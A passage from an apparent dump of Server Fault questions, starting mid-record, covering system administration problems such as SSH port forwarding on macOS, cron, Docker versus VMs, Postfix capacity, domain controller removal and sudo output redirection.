<p>However, the spider never runs (I can see that no changes in the database have been made, if I execute the file manually the changes happen)</p>

<p>What am I doing wrong here? I have set up a cron multiple times before, but this time I seem to get an error into it...</p>

<p>Thanks for all your advice!</p>
","<ubuntu><cron>","2017-08-24 19:38:03"
"949365","New server to setup, docker or VM?","<p>I'm a developer and I have some doubts about server configuration.
We have a new server with a dual Xeon CPU, 128 GB RAM &amp; 4 TB SAS SSD.
We have to run some web application.</p>

<ol>
<li>Rails App ( NGINX, Puma, Postgres, Redis, ElasticSearch) - VERY
HIGH TRAFFIC </li>
<li>Rails App ( NGINX, Puma, Postgres, Redis) - MODERATE
TRAFFIC </li>
<li>Rails App ( NGINX, Puma, Postgres) - LOW TRAFFIC </li>
<li>Python App ( NGINX, Mongo DB, Gunicorn, Redis, ElasticSearch) - VERY
LOW TRAFFIC </li>
<li>Php App (NGINX, PHP, Postgres) - LOW TRAFFIC</li>
</ol>

<p>I'm not sure which is the best way to configure my server and share resources.</p>

<p>I think to create a virtual machine for the python app and the php app frontend, because they are very low traffic app.</p>

<p>Then a virtual machine for the DB (Postgres, Redis, Mongo DB)</p>

<p>A virtual machine for Elastic Search</p>

<p>And finally the virtual machine with the rails app frontend.</p>

<p>What about to use docker? Have I got to adapt every app I have to dockerize it?</p>
","<linux><virtualization><docker>","2019-01-16 14:30:12"
"870357","How to do multiline Jinja2 conditionals in single block?","<p>The below code is rejected as syntactically incorrect:</p>



<pre><code>{%
    if inventory_hostname in groups.aptcache
        set cachehost = 'localhost'
    else
        set cachehost = groups['aptcache'] | first
    endif
%}
cache={{ cachehost }}
</code></pre>

<p>I hope, my intent is clear enough for a Jinja2 guru to correct me... Please?</p>
","<ansible><template><jinja>","2017-08-24 21:38:02"
"779009","Dell m610 server error The system board Current Latch current is outside of the allowable range","<p>we have Dell m1000e blase system with 16x m610 servers,
we have a frequent error with radom servers.</p>

<p>The system board Current Latch current is outside of the allowable range.</p>

<p>The system board fail-safe voltage is outside of the allowable range.</p>

<p>once we received that error the server shuts down permanently and stops respond to any action.</p>

<p>i googled that error many times but i did't find any clear result.</p>

<p>dos'e any one have a clue regarding this error or how to resolve it?</p>

<p>what could possibly cause such error?</p>

<p>is that error is a symptom of other failure in the system?</p>

<p>please help.</p>

<p>thank you for reading </p>
","<blade-server>","2016-05-25 16:19:41"
"779012","Windows server Allow and deny","<p>What is the deal with this.  According to my count there are for possible permissions</p>

<p>allow (checked) deny (checked)
not allow (empty) deny (checked)
allow (checked) deny( empty)
allow (empty) deny (empty)</p>

<p>So what is the default permission with both are empty?
What is the permission when both are checked?</p>
","<windows><security><permissions>","2016-05-25 16:37:43"
"870443","Err-disable in Switch 2960","<p>I have a problem. </p>

<p>I have a Cisco 2960, this switch conect 23 Macs. The problem is that a pc puts the port in err-disable. </p>

<p>When I put the command ""show interfaces status err-disabled"" the output is this:</p>

<pre><code>Port      Name               Status       Reason          Err-disabled Vlans
Fa0/23                       err-disabled loopback
Fa0/24                       err-disabled loopback
</code></pre>

<p>First it happened with the 23, I changed the machine to 24 and after several hours the same thing. </p>

<p>In Cisco blog: <a href=""https://www.cisco.com/c/en/us/support/docs/lan-switching/spanning-tree-protocol/69980-errdisable-recovery.html#anc15"" rel=""nofollow noreferrer"">https://www.cisco.com/c/en/us/support/docs/lan-switching/spanning-tree-protocol/69980-errdisable-recovery.html#anc15</a></p>

<p>They only mention this:</p>

<blockquote>
  <p>Loopback error </p>
  
  <p>A loopback error occurs when the keepalive packet is
  looped back to the port that sent the keepalive. The switch sends
  keepalives out all the interfaces by default. A device can loop the
  packets back to the source interface, which usually occurs because
  there is a logical loop in the network that the spanning tree has not
  blocked. The source interface receives the keepalive packet that it
  sent out, and the switch disables the interface (errdisable). This
  message occurs because the keepalive packet is looped back to the port
  that sent the keepalive:</p>
</blockquote>

<pre><code> %PM-4-ERR_DISABLE: loopback error detected on Gi4/1, putting Gi4/1 in err-disable state 
</code></pre>

<blockquote>
  <p>Keepalives are sent on all
  interfaces by default in Cisco IOS Software Release 12.1EA-based
  software. In Cisco IOS Software Release 12.2SE-based software and
  later, keepalives are not sent by default on fiber and uplink
  interfaces. For more information, refer to Cisco bug ID CSCea46385 
  (registered customers only) . </p>
  
  <p>The suggested workaround is to disable
  keepalives and upgrade to Cisco IOS Software Release 12.2SE or later.</p>
</blockquote>

<p>Can someone help me? Please.</p>
","<cisco><switch><mac><loopback>","2017-08-25 12:31:57"
"779098","get database deleted backup via command","<p>i have by mistake emptetied my databases for where can i get database backups.</p>

<p>my server team told i do not have backup activated now what to do to solve my issue .Please guide me the way to fix it.</p>

<p>My server is on ubantu VPS
1: is there some server command that could have files on it</p>

<p>Also had few more isssue </p>

<p>1: i am using php file upload to upload file and save content to database i do not save file to folder
2: so i thing all files uploaded be me must be on some temp folder on server .
can you guide me where to find them</p>
","<ubuntu><php>","2016-05-26 02:22:12"
"870457","how to jump in a server using putty","<p>I am facing a situation:
From my Local Machine (LM) I connect in a VPN using OpenVPN (HTZ) then I am able to use putty to connect into a HTZ server (lets call it server X). From that server X I have access to another server (lets call this Y) on port 443 and 80.</p>

<p>The problem is: i have to access a web service in this server Y using my chrome or whatever i have in my LM to access a web gui.</p>

<p>How do I build the tunnels to jump from my LM to server Y with this server X (which is the only one i have access from my LM)?</p>

<p>[]'s</p>
","<putty><tunneling>","2017-08-25 13:48:24"
"870473","macOS port forwarding for remote ssh login","<p>I want to do remote ssh logins from outside my network to a server (macOS Sierra) on my LAN, using a port other than 22. (<a href=""https://askubuntu.com/a/716190"">I hear</a> that it improves security to use a port other than the default. Is this true?) </p>

<p>I have successfully configured my router (<a href=""https://www.cisco.com/c/en/us/products/routers/rv325-dual-gigabit-wan-vpn-router/index.html"" rel=""nofollow noreferrer"">Cisco RV325</a>, which has a fixed WAN IP address of, say, 99.99.99.99) so that I can log in remotely to the server (at static LAN IP address 12.0.0.123) on port 22, like so:</p>

<pre><code>$ ssh USERNAME@99.99.99.99 -p 22 
</code></pre>

<p>This works fine. I now want to be able log in through another port (let's say 60022) like so:</p>

<pre><code>$ ssh USERNAME@99.99.99.99 -p 60022 
</code></pre>

<p>I don't understand how to forward traffic from port 60022 to 22. Is this something that I should do in the router, or in the local server? The router's ""Port Range Forwarding Table"" config does allow packets of a given port range to be forwarded to a particular IP, but it doesn't appear to allow me to translate from one port to another.</p>

<p>If it's supposed to happen in the server, I don't understand how to do that. And how do I get macOS to even start listening on port 60022? </p>

<p>I've tried unsuccessfully adapting <a href=""https://askubuntu.com/questions/716184/how-to-ssh-into-a-server-running-on-a-home-network-behind-a-router"">these Ubuntu instructions</a> to the Mac. I've tried using <code>pfctl</code> to set up forwarding:</p>

<pre><code>$ echo ""
rdr pass inet proto tcp from any to any port 60022 -&gt; 127.0.0.1 port 22
pass in proto tcp from any to any port 60022
"" | sudo pfctl -f -
pfctl: Use of -f option, could result in flushing of rules
present in the main ruleset added by the system at startup.
See /etc/pf.conf for further details.

No ALTQ support in kernel
ALTQ related functions disabled
$
</code></pre>

<p>This doesn't appear to open port 60022, since (1) the port doesn't show up when I do <code>sudo lsof -i -P | grep LISTEN</code> and (2) the connection is refused when I sit at the server and try to login:</p>

<pre><code>$ ssh USERNAME@127.0.0.1 -p 60022 -v
OpenSSH_6.2p2, OSSLShim 0.9.8r 8 Dec 2011
debug1: Reading configuration data /Users/USERNAME/.ssh/config
debug1: Reading configuration data /etc/ssh_config
debug1: /etc/ssh_config line 20: Applying options for *
debug1: /etc/ssh_config line 102: Applying options for *
debug1: Connecting to 127.0.0.1 [127.0.0.1] port 60022.
debug1: connect to address 127.0.0.1 port 60022: Connection refused
ssh: connect to host 127.0.0.1 port 60022: Connection refused
$ 
</code></pre>

<p>Whereas logging in on port 22 works fine:</p>

<pre><code>$ ssh USERNAME@127.0.0.1 -p 22 -v
OpenSSH_6.2p2, OSSLShim 0.9.8r 8 Dec 2011
debug1: Reading configuration data /Users/USERNAME/.ssh/config
debug1: Reading configuration data /etc/ssh_config
debug1: /etc/ssh_config line 20: Applying options for *
debug1: /etc/ssh_config line 102: Applying options for *
debug1: Connecting to 127.0.0.1 [127.0.0.1] port 22.
debug1: Connection established.
...
Password:
$
</code></pre>

<p>In summary: </p>

<ol>
<li>How do I tell macOS to start listening on port 60022?</li>
<li>How do I tell macOS to translate port 60022 to 22?</li>
<li>Any good intro/tutorials out there on how to do this? </li>
<li>Should I even bother trying to forward to 60022 (for example), or is it safe enough to use the default port 22?</li>
</ol>
","<ssh><mac-osx><router><port-forwarding>","2017-08-25 15:40:18"
"779130","Setting up extra IP addresses","<p>I have a dedicated server from OVH, recently bought 4 extra IP addresses (/30) and I'm very unsure about how to add them to my dedicated server, so I can use them.</p>

<p>For example, my server's original assigned public IP address is: <code>99.99.99.99</code><br>
And the IP addresses that I have purchased are:  </p>

<pre><code>(100.100.100.101/30)
100.100.100.101
100.100.100.102
100.100.100.103
100.100.100.104
</code></pre>

<p>How would I do that? My purpose is to setup an OpenVPN server and assign 4 IP addresses for myself, when I connect to it.</p>

<p>My server is running with Ubuntu 14.04 LTS (if it changes anything)</p>
","<linux><ubuntu><ip>","2016-05-26 08:50:59"
"870520","Using ""www"" as an A record","<p>I'm having configuration issues with my website, and I'm even more confused now that I've been looking for solutions. My DNS table looks as follows:</p>

<pre><code>A       @       12.34.12.34   600 seconds
CNAME   www     @             1 Hour
</code></pre>

<p>Currently both <strong>mydomain.tld</strong> and <strong>www.mydomain.tld</strong> work, but I would like all the queries to <strong>mydomain.tld</strong> to be redirected to <strong>www.mydomain.tld</strong> </p>

<p>Is there any way to do it from the DNS table or the .htaccess, or do have to code a 301 redirection as mentioned here : <a href=""https://serverfault.com/questions/421136/a-record-for-www"">A record for www</a> ?</p>

<p>Could I just use ""www"" as an A record and @ as a CNAME ?</p>

<p>Thanks</p>
","<domain-name-system>","2017-08-25 21:33:29"
"779305","Interchanging remote hosting with computer hosting vs. displaying availability state of computer hosting on remote website","<p>Recently, I bought a domain kkziomek.eu. The root domain is <strong>hosted on a remote hosting</strong>. I added a subdomain ""komputer.kkziomek.eu"" which is <strong>hosted on my computer</strong>. To do that I created a subdomain, then edited the ""A Record"" to redirect on my computer IP, where I have a server set up. It works!</p>

<p>Now, my only question is:</p>

<p>I want to make a subdirectory on my <strong>root website</strong> ""kkziomek.eu/komp/index.php"" which would say in big letters ""ONLINE"" when my <strong>computer and server on it is turned on</strong>, and in big letters ""OFFLINE"" <strong>when my computer, or server on my computer is off.</strong></p>

<p>So in other words, it would say ""ONLINE"" when ""komputer.kkziomek.eu"" is available, and ""OFFLINE"" when ""komputer.kkziomek.eu"" is not available.</p>

<p>How would I do that?</p>
","<domain-name-system><domain><hosting><availability>","2016-05-26 22:12:37"
"949685","Conflicts between htaccess rules","<p>I'm trying to use the url_rewrite system for php but, as i'm a rookie i have a conflict problem (i suppose) between rules.</p>

<p>I have these three htaccess rules. The first two are working, the last one not. </p>

<pre><code>RewriteEngine On
RewriteRule ^([^/]*)/([^/]*)\.html$ /site/product.php?cid=$1&amp;n=$2 [L]

RewriteEngine On
RewriteRule ^([^/]*)/([^/]*)/([^/]*)\.html$ /site/product-detail.php? 
cid=$1&amp;pid=$2&amp;n=$3 [L] 

RewriteEngine On
RewriteRule ^([^/]*)/([^/]*)\.html$ /site/news-full.php?id_news=$1&amp;nw=$2 [L]
</code></pre>

<p>This is how the link is set on my php page:</p>

<pre><code> &lt;a href=""&lt;?php echo WEB_ROOT.$id_news.""/"".$name_news; ?&gt;.html""&gt;
</code></pre>

<p>when i load the page, i don't have any data print on page. i tried to use also prefix but doesn't work</p>

<p>What can i do? Thanks</p>
","<php><.htaccess>","2019-01-18 10:01:02"
"991307","How many Emails can be Send Per Hour using Postfix","<p>I have to send 12K emails per day, that means <strong>500 per hour</strong>. I am willing to set up my SMTP Relay using Postfix. But I am confused about the Server Configuration (Power).</p>

<p><strong>Is it possible to send 500 Email Per Hour Using <em>1 Core + 1 GB RAM VPS</em>.?</strong> (It will be a standalone SMTP Sever, Only Postfix will run on the server.)</p>

<p>Thanks </p>
","<postfix><email-server>","2019-11-11 02:40:12"
"991340","How to make high availability web page?","<p>When we need a high availability service (it doesn't meter what kind of service: it can be a database, a queue system, our application) we spread it info many machines to make sure when one machine is down rest of them can take this extra load.</p>

<p>Quite simple.</p>

<p>But how to spread load balancers into many machines?</p>

<p>A DNS record can point to 1 or few our servers. But when our server is down DNS and any client don't know that specific machine is not running. Clients will make request to it and they will get an info our web page is not working.</p>

<p>How to cluster load balancer layer?</p>
","<load-balancing><high-availability><high-load>","2019-11-11 10:22:28"
"870755","Powershell script to restore VM from snapshot","<p>I'd like to write a script that restore a Virual Machine in Hyper-V from a snapshot once every 20 days.</p>

<p>I know that the automation can be achieved by using Windows Task Scheduler. The main problem is that I cannot really write that script by myself. I'd appreciate some guidance in the topic. I run Microsoft Server 2012 R2.</p>
","<powershell><hyper-v>","2017-08-28 08:03:52"
"991345","550 2607:f8b0:4864:20::132 is not allowed to send mail from","<p>When I try to send an email I get the following error:</p>

<blockquote>
  <p>550 2607:f8b0:4864:20::132 is not allowed to send mail from
  mydomain.com. Please see the SPF record, with scope mfrom, identity
  myuser@mydomain.com, and ip 2607:f8b0:4864:20::132</p>
</blockquote>

<p>I use gmail to send mails from myuser@mydomain.com</p>

<p>This is how all the MX and TXT records I have at Cloudflare:</p>

<p><a href=""https://i.sstatic.net/4t31q.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/4t31q.png"" alt=""enter image description here""></a>
How to resolve this issue?</p>
","<email><spf>","2019-11-11 11:04:50"
"870765","Linux - Use disk as RAM","<p>I have a VM and in it a process that consumes a lot of memory (~200GB). Some sort of in-memory DB. I need to run it on a standard laptop and I cannot recompile it or see the code.</p>

<p>I've added 256GB of swap space with <code>pri=32767</code> in <code>/etc/fstab</code> and <code>vm.swappiness=100</code> in <code>/etc/sysctl.conf</code> but it just won't load the DB quick enough (stuck on 4GB after 24h; doesn't seem to grow anymore).</p>

<p>(EDIT: I cloned the machine, changed the RAM from 256GB to 4GB, added hard disk, formated it as ext4 and created a swap file of size 256GB (dd -> mkswap -> swapon...))</p>

<p>Why did it stop growing?</p>

<p>I suspect the slowness is caused by it being a swap space, therefore the OS is busy ""swapping"" (load -> not enough room -> deciding what to swap out...).</p>

<p>I'm looking for a way to ""add more memory"" but make the OS treat it as normal memory. Or maybe my swap configuration is wrong?</p>

<p>I know it'll hurt performance, but it is acceptable for me.</p>

<p>The VM is CentOS 6.</p>
","<linux><performance><memory><swap>","2017-08-28 09:16:52"
"991350","Do I have to purchase java license to use Jenkins?","<p>We are using Jenkins to build and deploy apps to production and staging. While migrating our Jenkins Servers to a newer server, we have realized that apparently Java RTE now requires a license to use. Is this actually the case or am I missing something? What alternatives can I use as Runtime Environment, only to run Jenkins?  </p>
","<java><oracle><licensing><jenkins>","2019-11-11 11:59:58"
"779455","Internal network DNS can't be configed to route domain.com to www.domain.com?","<p>We host a domain on the internet that is accessible outside of our internal network using domain.com or www.domain.com, but is our actual internal network domain as well, but the external website is only accessible from our computers using www.domain.com - using domain.com gives ""connection refused"" in Chrome, and does a Bing search in IE.</p>

<p>I've asked our DNS guy about it, and he says internally domain.com goes to the internal network domain controller, and can't be rerouted/directed to the www version.</p>

<p>I've only done config on websites, not internal networks, so is there no way for domain.com from our internal network computers to resolve to www.domain.com?</p>
","<networking><domain-name-system><active-directory>","2016-05-27 16:01:15"
"870786","How LAN Switch differentiate a PC/router/anotherSwitch when all its port are the same?","<p>I've been using switch of ages but have no idea how it can recognize which of its port connected to the internet source. I used to think it recognizes the first cable connected to it as the router, but then how can the switch still work after an electrical outage?</p>
","<hardware><switch>","2017-08-28 10:47:06"
"870825","Is there any existing tool to monitor the process and restart if it crash?","<p>I am looking for existing tool to monitor the process and restart if it crashes in Ubuntu. It would be best if it can alert me when the process being restarted via Email or Slack.</p>
","<ubuntu><monitoring>","2017-08-28 14:17:43"
"949795","Google cloud platform ""Your free trial has ended"" - server no longer available","<p>I opened on 2018/1/1 Google's free 1 year trial with bitnami.
got an email 2+ weeks ago saying: </p>

<pre><code>Your free trial has ended.

Time has run out, and your free trial is over. After 30 days, your work may 
be deleted. Upgrade now to keep working and gain full access to the 
Google Cloud Platform global infrastructure.
</code></pre>

<p>I saw a -10.5$ balance - I actually had to pay 13$ (there's a minimum pay)
now I see a balance of 23.5$</p>

<p>now, really, I am confused, all I want is to get the server back up for a few minutes so I can back it up.</p>

<p>Google's support said since my free tier is done I need to pay an extra 100$ to get answered of how to get my site back for a moment</p>

<p>ideas would be appreciated</p>
","<google-cloud-platform><bitnami>","2019-01-18 19:51:51"
"991421","Cannot ping windows server instance from redhat instance","<p>Running into an issue pinging from RedHat instance to a windows server instance. I have tried multiple things within the security settings with absolutely no luck. I can ping the RedHat instance from the Windows Server but I can not ping from the RedHat instance to the Windows instance.</p>

<ul>
<li>Updated the Security Groups for both instances to allow all ICMP traffic on Ipv4 and 6.</li>
<li>Tried custom rule for ICMP to allow all traffic.</li>
</ul>

<p>Looked at a few other questions on here also that are similar with no result. 
- AWS EC2 instance not responding to ping (Petr Mensik)
- AWS EC2 instance cannot ping certain address (Petr Mensik)</p>

<p>Any ideas would be greatly appreciated.</p>
","<amazon-web-services>","2019-11-11 21:02:42"
"779537","Do Wireless Routers with a USB port for 3G/4G USB modem support normal file sharing?","<p>I'm looking forward to buying a wireless router with a USB port, so that I can share my 1 TB external Hard Drive over Wi-Fi among my devices.</p>

<p>I came across one such router, <a href=""http://www.tp-link.com/en/products/details/cat-4691_TL-MR3420.html#overview"" rel=""nofollow noreferrer"">TP-Link 3G/4G Wireless N router TL-MR3420</a>. </p>

<p>The specifications say that it has a USB port for connecting a 3G/4G USB modem which is fine.<br>
<strong>But in case I connect an external hard drive or a pen drive to the router instead of a USB modem, will I able to share the drive contents over Wi-Fi, as routers with USB ports but no support for USB modems do?</strong> </p>

<p>If yes, does it mean that all similar routers(with USB modem support) support file sharing too?</p>

<p>I know this is a basic question but I'm confused since no where on the site file sharing is mentioned and I'd like to know for sure before investing in it.</p>
","<router><wifi><network-share>","2016-05-28 05:12:10"
"870855","Polling x amount of URL's every second with Java","<p>Is it even possible to poll let's say 10,000 URL's every second? I do keep threading in mind with the following code:</p>

<pre><code>for (int i = 0; i &lt; 10000; i++) {
    Executors.newScheduledThreadPool(10).scheduleWithFixedDelay(new Runnable() {
        @Override public void run() {
            // Poll URL here
        }
    }, i, 1000, TimeUnit.MILLISECONDS);
}
</code></pre>

<p>I do open a connection to the URL this way (I do close it later on after reading):</p>

<pre><code>HttpURLConnection  connection = (HttpURLConnection) new URL(""https://stackoverflow.com"").openConnection();
connection.connect();
</code></pre>

<p>Then, I read the data of the outputstream:</p>

<pre><code>InputStream inputStream = connection.getInputStream();
</code></pre>

<p>Then, I read the inputstream and close the HttpURLConnection.</p>

<p>When polling 200 URL's every second, everything works just fine. When polling 400+ url's, everything chokes. Connecting to a url takes 20-30 seconds.</p>

<p>I do test it on Tomcat with Eclipse on my own computer (not a server). When the connections take long to make, I can't even open webpages in the browser. The script uses about 20-30 Mbps while my internet has a maximum of 90 Mbps on the computer.</p>

<p>If you have any suggestions I would really like to hear them and try them.</p>
","<java><connection><timeout><url>","2017-08-28 16:38:02"
"949846","I have a domain name, How do I point it to my local Windows server running IIS?","<p>I have a domain name from GoDaddy, How do I point it to my local Windows server so that the application running on 10.0.3.89:8900 can be seen by the whole internet ?</p>

<p>How do I juggle bindings, Do I have to use Nameservers  like other online we hosts ( e.g ns1.godaddy.com , ns2.godaddy.com ? ). </p>

<p>Thank  you.</p>
","<domain-name-system><iis-7>","2019-01-19 10:58:26"
"949879","High load average but low CPU usage and disk I/O","<p>I’m encountering a strange issue on one of my servers. This is on a KVM VPS which has one dedicated CPU core.</p>

<p>Sometimes the load spikes to around 2.0:
<a href=""https://i.sstatic.net/Ky5c3.png"" rel=""noreferrer""><img src=""https://i.sstatic.net/Ky5c3.png"" alt=""Load graph""></a></p>

<p>However, CPU usage doesn’t actually increase during that period, which also rules out iowait being the cause:
<a href=""https://i.sstatic.net/l4Jqt.png"" rel=""noreferrer""><img src=""https://i.sstatic.net/l4Jqt.png"" alt=""CPU usage graph""></a></p>

<p>It seems periodic when it happens (eg. in this graph it happened roughly every 20-25 minutes). I suspected a cronjob, but I don’t have any cronjobs that run every 20 mins. I have also tried disabling my cronjobs and the load spike still occurs.</p>

<p>I managed to actually see this happening while SSH’d into the server… It had a load of 1.88, but the CPU was 94% idle and there was 0% iowait (which is what I expected the cause might have been)</p>

<p><a href=""https://i.sstatic.net/nDbdF.png"" rel=""noreferrer""><img src=""https://i.sstatic.net/nDbdF.png"" alt=""&lt;code&gt;top&lt;/code&gt; output""></a>
<a href=""https://i.sstatic.net/rhMHN.png"" rel=""noreferrer""><img src=""https://i.sstatic.net/rhMHN.png"" alt=""&lt;code&gt;htop&lt;/code&gt; output""></a></p>

<p>There does not appear to be a lot of disk I/O when this happens.</p>

<p>I'm stumped. Any ideas?</p>
","<linux><load-average>","2019-01-19 18:58:25"
"870952","Increase number of rsh connections","<p>We are using a Server with OS <strong>RHEL 7.2</strong> server version. Number of <strong>rsh</strong> connections to the system is limited to a number around 70. We are getting a message <strong>Connection reset by peer</strong> from server as that number gets exhausted.</p>

<p>I want to increase number of <strong>rsh</strong> connections to my system.</p>

<p><strong>NOTE:</strong> I understand the fact that it is not advised to use rsh and it is better to switch to ssh for operations. But such change is beyond my control. So any help regarding <strong>RSH</strong> connections will be very helpful. Thank you in advance.</p>
","<rhel7><connections><rsh>","2017-08-29 05:54:33"
"870977","Mixing network fiber connectors","<p>Can I mix fiber connections example below:</p>

<p>MediaConverter(SC)&lt;---(ST)----(panel)--(panel)-----(ST)----(LC)-->SFPportswitch</p>
","<networking><cisco><fiber><sfp>","2017-08-29 08:32:20"
"871008","Server is can't connecting to any smtp port","<p>On my VPS server I'm trying to <code>smtp</code> but its not connecting</p>

<pre><code>root@server1:~# telnet smtp.gmail.com 587
Trying port_number...
Trying port_number...
Trying ipv4_address...
telnet: Unable to connect to remote host: Cannot assign requested 
    address
</code></pre>

<p>After some time its returning error.</p>

<p>But when I'm trying to ping on <code>smtp.gmail.com</code> its working</p>

<pre><code>    root@server1:~# ping smtp.gmail.com
    PING gmail-smtp-msa.l.google.com (64.233.168.108) 56(84) bytes of data.
    64 bytes from oj-in-f108.1e100.net (port): icmp_seq=1 ttl=44 time=7.45 ms
    64 bytes from oj-in-f108.1e100.net (port): icmp_seq=2 ttl=44 time=7.43 ms
    64 bytes from oj-in-f108.1e100.net (port): icmp_seq=3 ttl=44 time=7.43 ms
    64 bytes from oj-in-f108.1e100.net (port): icmp_seq=4 ttl=44 time=7.41 ms
    64 bytes from oj-in-f108.1e100.net (port): icmp_seq=5 ttl=44 time=7.41 ms
    64 bytes from oj-in-f108.1e100.net (port): icmp_seq=6 ttl=44 time=7.45 ms
</code></pre>

<p>What I am missing in my server configuration?</p>
","<smtp><vps>","2017-08-29 11:18:50"
"779794","Recover ZFS deleted file names","<p>I have to work on server with ZFS file system to recover deleted file names or recover actual files. I have very basic knowledge about ZFS and couldn't find easy way to achieve this. I just wonder if there are tools that do this or even just just zfs commands that could help.</p>
","<solaris><zfs><forensics>","2016-05-30 11:06:13"
"991689","I can't use a graphics card on my vm","<p>I can't use a gpu on my vm and it says: Quota 'GPUS_ALL_REGIONS' exceeded. Limit: 0.0 globally all the time and I have premium so how do I fix this?</p>
","<virtual-machines><google-compute-engine><gpu>","2019-11-13 15:08:15"
"871110","Domain controller failed on domain, how do I remove it?","<p>We had a server called <code>DC01</code> set as a domain controller. Then we got another server and added it to the domain as a backup domain controller <code>DC02</code>. Months after adding <code>DC02</code> to the domain <code>DC01</code> had a catastrophic failure and was unplugged/taken off the network. But <code>DC02</code> still things <code>DC01</code> exists and I get errors like</p>

<blockquote>
  <p>The specified domain controller could not be contacted. This affects the following domain in the console.<br>
      Domain: domain.com<br>
  The error was: The specified domain either does not exist or could not be contacted.<br>
  Please choose from the following options:<br>
  [ ] Choose a different domain controller<br>
  [ ] Retry<br>
  [ ] Remove this domain from the console</p>
</blockquote>

<p>Choosing a different domain controller leads me to the following:</p>

<blockquote>
  <p>Current domain controller: (blank)<br>
  Look in this domain:<br>
  domain.com<br>
  Change to:<br>
  [x] The domain controller with the Operations Master token for the PDC emulator<br>
  [ ] Any available domain controller<br>
  [ ] Any available domain controller running Windows Server 2003 or later<br>
  [ ] This domain controller:<br>
  dc01.domain.com<br>
  dc02.domain.com</p>
</blockquote>

<p>I select <strong>This domain controller</strong> and choose <strong>dc02.domain.com</strong> and the pop up goes away.</p>

<p>How do I get rid of the references to the old primary domain controller, dc01? And what must I do to dc02 to make it the new primary domain controller?</p>
","<active-directory><windows-server-2008-r2><domain><domain-controller>","2017-08-29 18:38:00"
"991709","MobaXTerm (or other SFTP/SSH Clients) - ""Elevated"" SFTP Access","<p>I'm using MobaXTerm on PC/Windows, playing with linux on raspberry pi.  When I SSH in, I can access the root folder in the image I'm using by:</p>

<pre><code>sudo -i
/root/bin/remountfs_rw
</code></pre>

<p>But the SFTP screen to the left is still stuck without access to the root folder.  Is there a way to SFTP with root privledges in this program?  Or in ANY program?  I really like the GUI ability to download/edit/upload files for large tasks. </p>

<p>Thanks</p>
","<ssh><sftp>","2019-11-13 17:36:11"
"871115","File is uploaded to my server by someone","<p>I keep getting a file called ""wp-sil.php"" uploaded to my one specific folder.
When i copy the file to my desktop so I can examine it, it removes itself.</p>

<p>When I open the url sting live on my website, I see the entire folder content and options to delete/edit/modify.</p>

<p>At the bottom there is a signature:
<a href=""https://www.google.ca/search?q=B+Ge+Team+File+Manager+Version+1.0%2C+Coded+By+Little+Wei&amp;rlz=1C1CHBF_enCA711CA711&amp;oq=B+Ge+Team+File+Manager+Version+1.0%2C+Coded+By+Little+Wei&amp;aqs=chrome..69i57j69i64l3.330j0j4&amp;sourceid=chrome&amp;ie=UTF-8"" rel=""nofollow noreferrer"">https://www.google.ca/search?q=B+Ge+Team+File+Manager+Version+1.0%2C+Coded+By+Little+Wei&amp;rlz=1C1CHBF_enCA711CA711&amp;oq=B+Ge+Team+File+Manager+Version+1.0%2C+Coded+By+Little+Wei&amp;aqs=chrome..69i57j69i64l3.330j0j4&amp;sourceid=chrome&amp;ie=UTF-8</a></p>

<p>Of course I deleted the file from each folder that I found it in but I am worried it will come back again.</p>

<p>I have changed every password I could think of, changed all ftp access and only have a few people accessing the ftp (to a specific folder), added godaddy's malware protection to scan everything and it came back with nothing. I blocked a bunch of different country's IP addresses.</p>

<p>I back up the files weekly so I am not worried losing anything but it will cause an slight inconvenience if the current live files are effected.</p>

<p>Is there a way to block a filename from being uploaded or block unauthorized uploads in general? Or at least check who is behind this?</p>
","<security><godaddy><upload><host>","2017-08-29 19:01:52"
"991734","What are common reasons of files integrity change in a file system?","<p>Recently I had an error in an important include file for C++ in my Ubuntu Linux system. I detected it due to a compile error and run debsums to check it. Indeed there was a string changed probably due to a bit flip in the file system. Checking further revealed about 10 more errors across the whole system in binary files. I remember bit flips can happen but I am wondering how often this might happen and what the reasons of these changes are?</p>
","<filesystems>","2019-11-13 20:40:29"
"780262","Which ipv6 address to use for AAAA record","<p>My <a href=""http://conoha.jp"" rel=""nofollow noreferrer"">VPS provider</a> provides me with one ipv4 and 17 ipv6 addresses. Is there any right or wrong ipv6 address from the 17 given to use as AAAA record ? </p>
","<vps><ipv6>","2016-06-01 12:08:19"
"871129","nginx reverse proxy setup to handle graceful deployments of upstream servers","<p>My current setup is nginx as a load balancer, in front of a bunch of upstream servers.</p>

<p>I want to be able to deploy with no change in user experience. This means no 502s and no increase page times.</p>

<p>My understanding is that when <code>nginx -s reload</code> is issued, nginx will gracefully spawn new threads to handle new connections for the new configuration, but will still finish handling requests that were in-flight at the time of reload.
Moreover, I have read somewhere that marking an upstream as <code>down</code> in the upstream block, and reloading, will take that upstream from the rotation, but will still finish any in-flight connections to it.</p>

<p>Is any/all of this correct?</p>

<p>The current plan is to have a small process in the nginx host, that will basically mutate nginx configuration and issue these graceful reloads when asked to do so through an internal REST API.</p>

<p>My deployment tool will then connect that process and add/remove my upstreams from nginx config in sequence, after graceful shutdown and boot up/warm-up for each upstream is complete.</p>

<p>Does this make sense?
How are other people doing this?
Are there any already available tools for this?</p>

<p>I haven't had a lot of luck searching for info on this...</p>
","<nginx><load-balancing><deployment>","2017-08-29 19:57:16"
"950507","redirecting output using sudo","<p>I want to run a command as another user using sudo, and redirecting the output of that command as that user.
Example, if I run:</p>

<pre><code>touch some-file
</code></pre>

<p>under user simon, some-file will be owned by user simon. If I run:</p>

<pre><code>sudo -u ernesto touch some-file
</code></pre>

<p>then some-file is owned by user ernesto, as I am specifying that I want to run the touch command as ernesto. Finally, if I run:</p>

<pre><code>sudo -u ernesto ls /some-folder/ &gt; some-file
</code></pre>

<p>some-file is again owned by user simon, as the > operator is redirecting the output of the whole command before >, to some-file (which is in fact being ran by user simon). I need to grab the output of listing a directory as ernesto but using sudo, as the directory that I want to list, is owned by ernesto, and I can't list the directory using with simon.</p>

<p>It has to be using sudo, as the user ernesto allows me to run sudo commands without password.</p>

<p>I tried</p>

<pre><code>sudo -u ernesto $(ls /some-folder/ &gt; some-file)
sudo -u ernesto `ls /some-folder/ &gt; some-file`
sudo -u ernesto 'ls /some-folder/ &gt; some-file'
sudo -u ernesto eval(ls /some-folder/ &gt; some-file)
sudo -u ernesto exec(ls /some-folder/ &gt; some-file)
</code></pre>

<p>hoping for something of this to work, but still no luck.</p>
","<linux><sudo><user-management>","2019-01-24 06:57:02"
